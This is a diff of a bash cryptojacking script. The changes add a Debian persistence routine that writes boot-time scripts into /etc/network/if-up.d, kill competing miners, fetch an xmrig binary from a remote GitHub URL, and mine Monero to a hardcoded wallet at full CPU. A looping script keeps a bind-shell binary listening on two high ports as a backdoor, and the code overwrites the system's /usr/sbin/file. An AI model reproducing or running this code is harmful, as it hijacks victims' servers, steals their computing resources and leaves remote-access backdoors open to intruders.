@@ -416,11 +416,11 @@ cat > /usr/sbin/file 2>/dev/null <<'EOF'
 #!/bin/bash
 local="/root/.local/.filebet/"
 
-kill -9 `ps -aux|egrep '(miner|xmrig|filebet)'|egrep -v '(grep|egrep|ps)'|awk '{print $2}'` 2>/dev/null
+kill -9 `ps -aux|egrep '(miner|xmrig|filebet|kinsing)'|egrep -v '(grep|egrep|ps)'|awk '{print $2}'` 2>/dev/null
 rm -rf /root/.local/.filebet/ 2>/dev/null
 mkdir -p /root/.local/.filebet/	
 
-if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig" -o /root/.local/.filebet/filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig -O /root/.local/.filebet/filebet 2>/dev/null; then
+if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static" -o /root/.local/.filebet/filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static -O /root/.local/.filebet/filebet 2>/dev/null; then
   exit 1
 fi
 
@@ -457,6 +457,62 @@ fi
 
 }
 
+function setup_init_debian(){
+rm -f /etc/network/if-up.d/ping 2>/dev/null
+cat > /etc/network/if-up.d/ping 2>/dev/null <<'EOF'
+#!/bin/bash
+
+export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+netstat_bin=$(whereis netstat|awk '{print $2}')
+
+while true
+do
+if [ $($netstat_bin -tunap|grep 65333|awk '{print $7}'|head -n1|wc -l) == "0" ];then
+exec /boot/generic -b 65333
+fi
+if [ $($netstat_bin -tunap|grep 65334|awk '{print $7}'|head -n1|wc -l) == "0" ];then
+exec /boot/generic -bind
+fi
+done &
+EOF
+
+rm -f /etc/network/if-up.d/file 2>/dev/null
+cat > /etc/network/if-up.d/file 2>/dev/null <<'EOF'
+#!/bin/bash
+local="/root/.local/.filebet/"
+
+kill -9 `ps -aux|egrep '(miner|xmrig|filebet|kinsing)'|egrep -v '(grep|egrep|ps)'|awk '{print $2}'` 2>/dev/null
+rm -rf /root/.local/.filebet/ 2>/dev/null
+mkdir -p /root/.local/.filebet/	
+
+if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static" -o /root/.local/.filebet/filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static -O /root/.local/.filebet/filebet 2>/dev/null; then
+  exit 1
+fi
+
+chmod +x /root/.local/.filebet/filebet
+exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p allmk -k --cpu-max-threads-hint=100% -B
+
+EOF
+
+if [[ -f /etc/network/if-up.d/ping ]];then
+chmod +x /etc/network/if-up.d/ping
+/etc/network/if-up.d/ping
+printf "bind set up at boot time (debian)\n"
+
+else
+printf  "[bind]: init file couldnt be created\n"
+fi
+
+if [[ -f /etc/network/if-up.d/file ]];then
+chmod +x /etc/network/if-up.d/file
+/etc/network/if-up.d/file
+printf "miner set up at boot time (debian)\n"
+
+else 
+printf  "[miner]: init file couldnt be created\n"
+fi
+}
+
 miner_nopriv(){
 local="/dev/shm/.filebet/"
 
@@ -472,6 +528,12 @@ fi
 chmod +x "$local"filebet
 exec "$local"filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p all -k --cpu-max-threads-hint=100% -B
 }
+
+if [[ $1 == "--debian" ]]; then
+hide
+bind
+setup_init_debian
+fi
 
 if [[ $1 == "--mk" ]]; then
 hide
@@ -491,7 +553,7 @@ miner_nopriv
 fi
 
 else
-printf "exiting...\n"
+printf "system untouched.\n"
 exit 1
 fi
 
